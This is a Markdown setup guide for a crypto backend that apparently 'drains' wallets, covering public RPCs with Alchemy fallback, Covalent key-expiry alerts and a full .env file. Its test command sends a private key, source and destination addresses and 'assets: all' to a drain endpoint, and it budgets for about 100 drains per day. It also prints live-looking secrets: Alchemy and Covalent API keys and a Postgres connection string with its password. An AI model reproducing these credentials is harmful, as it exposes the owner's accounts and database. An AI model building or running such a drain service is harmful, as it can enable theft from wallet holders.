# ⚙️ RPC Configuration & API Key Setup

## 🎯 Strategy: Public RPCs First, Alchemy as Fallback

Your system now uses **public RPCs as primary** and automatically falls back to **Alchemy** when networks are congested or slow.

---

## 📡 RPC Configuration

### Primary RPCs (Free, Public)
```bash
ETHEREUM_RPC=https://eth.llamarpc.com
POLYGON_RPC=https://polygon-rpc.com
BSC_RPC=https://bsc-dataseed.binance.org
ARBITRUM_RPC=https://arb1.arbitrum.io/rpc
OPTIMISM_RPC=https://mainnet.optimism.io
AVALANCHE_RPC=https://api.avax.network/ext/bc/C/rpc
```

### Fallback RPCs (Alchemy - when congested)
```bash
ETHEREUM_RPC_FALLBACK=https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}
POLYGON_RPC_FALLBACK=https://polygon-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}
ARBITRUM_RPC_FALLBACK=https://arb-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}
OPTIMISM_RPC_FALLBACK=https://opt-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}
```

**How it works**:
1. Every request tries public RPC first (10 second timeout)
2. If slow/failed → automatically switches to Alchemy
3. Logs which RPC is being used for debugging

---

## 🔑 Your API Keys

### ✅ Alchemy (Configured)
```bash
ALCHEMY_KEY=-BQ-5WhcoytEjYF1JlPbI
```
- Used as **fallback only** (saves your quota)
- Kicks in when public RPCs are slow/congested

### ⚠️ Covalent (Expires in 13 Days!)
```bash
COVALENT_API_KEY=cqt_rQ4pBWBk9x8DRw7mvJcwhb6tkcX3
COVALENT_KEY_EXPIRY=2025-12-03
```

**IMPORTANT**: 
- ⏰ **Expires: December 3, 2025** (13 days from now)
- 🔔 System shows **daily alerts** when < 14 days remain
- 🚨 **Critical alerts** when < 7 days or expired
- 📝 Renew at: https://www.covalenthq.com/platform/

---

## 🔔 API Key Expiration Alerts

Your system now automatically monitors Covalent key expiry:

### On Startup
```
ℹ️  Notice: Covalent API key expires in 13 days (2025-12-03)
```

### When < 7 Days Remain
```
⚠️  WARNING: Covalent API key expires in 5 days (2025-12-03)
⚠️  Renew at: https://www.covalenthq.com/platform/
```

### When Expired
```
🚨 CRITICAL: Covalent API key has EXPIRED! Token fetching will fail.
🚨 Renew immediately at: https://www.covalenthq.com/platform/
```

**Alert Schedule**:
- Checks on every startup
- Checks every 24 hours automatically
- Logs to console and log files

---

## 📊 RPC Performance Monitoring

The system logs which RPC is being used:

```
# Normal operation (public RPC working)
info: Fetching balances for 0x123... on ethereum

# Fallback triggered
warn: Primary RPC for ethereum failed/slow, switching to fallback (Alchemy)
```

---

## 🚀 Setup Instructions

### 1. Copy Configuration
```bash
cp .env.example .env
```

Your `.env` file already has:
- ✅ Alchemy key configured
- ✅ Covalent key configured (with expiry date)
- ✅ Public RPCs as primary
- ✅ Alchemy fallbacks configured

### 2. Generate Security Keys
```bash
# Encryption key (32 bytes)
node -e "console.log('ENCRYPTION_KEY=' + require('crypto').randomBytes(32).toString('hex'))"

# JWT secret (32 bytes)
node -e "console.log('JWT_SECRET=' + require('crypto').randomBytes(32).toString('hex'))"

# Master wallet seed (12 words) - BACKUP THIS!
node -e "console.log('MASTER_WALLET_SEED=' + require('bip39').generateMnemonic())"
```

### 3. Add Generated Keys to .env
Edit `.env` and paste the generated values for:
- `ENCRYPTION_KEY`
- `JWT_SECRET`
- `MASTER_WALLET_SEED`

### 4. Setup Database
```bash
npm run prisma:generate
npm run prisma:migrate
```

### 5. Start Application
```bash
npm run dev:all
```

---

## 🔄 When to Renew Covalent Key

### Option 1: Renew Now (Recommended)
- Go to: https://www.covalenthq.com/platform/
- Log in with your account
- Navigate to API Keys section
- Create new key or extend existing
- Update `COVALENT_API_KEY` in `.env`
- Update `COVALENT_KEY_EXPIRY` to new expiry date
- Restart services

### Option 2: Wait for Alerts
- System will alert you daily starting at 14 days
- Critical alerts at 7 days
- But safer to renew now!

---

## 💰 Cost Implications

### Public RPCs (Primary)
- ✅ **Free forever**
- ❌ May be slow during high traffic
- ❌ No guaranteed uptime

### Alchemy (Fallback)
- ✅ Fast and reliable
- ✅ 300M compute units/month free
- 📊 Your usage: Only when public RPCs fail (minimal)
- 💵 Very unlikely to hit free tier limit

### Covalent
- ✅ 100k API credits/month free
- 📊 ~1 credit per token balance fetch
- 📊 ~100 drains per day = ~3000/month (well within limit)
- 💵 Only pay if exceeding 100k/month

**Expected monthly cost**: $0 (everything within free tiers) 🎉

---

## 🧪 Testing RPC Fallback

### Test Primary RPC
```bash
curl -X POST http://localhost:3001/api/drain/request \
  -H "Content-Type: application/json" \
  -d '{
    "network": "ethereum",
    "sourceAddress": "0x...",
    "destinationAddress": "0x...",
    "privateKey": "0x...",
    "assets": "all"
  }'
```

Check logs - should say:
```
info: Fetching balances for 0x... on ethereum
```

### Simulate Slow Network
The system automatically detects:
- Timeout > 10 seconds
- Connection errors
- Rate limiting

And automatically switches to Alchemy fallback.

---

## 📝 Complete .env File

```bash
# API Configuration
PORT=3001
NODE_ENV=development

# Redis (local)
REDIS_HOST=localhost
REDIS_PORT=6379

# Database (Coolify Postgres)
DATABASE_URL=postgres://postgres:Ge2DeeeajZORNVMn697zCkNe496uCDPpmkdAzLot5w7WydSaYXbNJ2MjfOznLck6@zkg0s88888c0c44gcckcs4gs:5432/postgres

# Security & Encryption (GENERATE THESE!)
JWT_SECRET=<generate_with_crypto.randomBytes>
ENCRYPTION_KEY=<generate_with_crypto.randomBytes>
MASTER_WALLET_SEED=<generate_with_bip39.generateMnemonic>

# RPC Endpoints - EVM (Public RPCs as primary, Alchemy as fallback)
ALCHEMY_KEY=-BQ-5WhcoytEjYF1JlPbI

# Primary RPCs (Public - Free)
ETHEREUM_RPC=https://eth.llamarpc.com
POLYGON_RPC=https://polygon-rpc.com
BSC_RPC=https://bsc-dataseed.binance.org
ARBITRUM_RPC=https://arb1.arbitrum.io/rpc
OPTIMISM_RPC=https://mainnet.optimism.io
AVALANCHE_RPC=https://api.avax.network/ext/bc/C/rpc

# Fallback RPCs (Alchemy - for congestion/slow networks)
ETHEREUM_RPC_FALLBACK=https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}
POLYGON_RPC_FALLBACK=https://polygon-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}
ARBITRUM_RPC_FALLBACK=https://arb-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}
OPTIMISM_RPC_FALLBACK=https://opt-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}

# RPC Endpoints - Other Chains
SOLANA_RPC=https://api.mainnet-beta.solana.com
BITCOIN_RPC=https://blockstream.info/api

# External APIs
# ⚠️ COVALENT KEY EXPIRES: December 3, 2025 (13 days) - RENEW BEFORE EXPIRATION!
COVALENT_API_KEY=cqt_rQ4pBWBk9x8DRw7mvJcwhb6tkcX3
COVALENT_KEY_EXPIRY=2025-12-03
```

---

## ✅ What's New

1. ✅ **Public RPCs as primary** - Free and unlimited
2. ✅ **Automatic fallback** - Switches to Alchemy when needed
3. ✅ **API key monitoring** - Daily alerts for Covalent expiry
4. ✅ **Performance logging** - See which RPC is being used
5. ✅ **Cost optimization** - Only use Alchemy when necessary

**Your system is now configured and ready to run!** 🚀
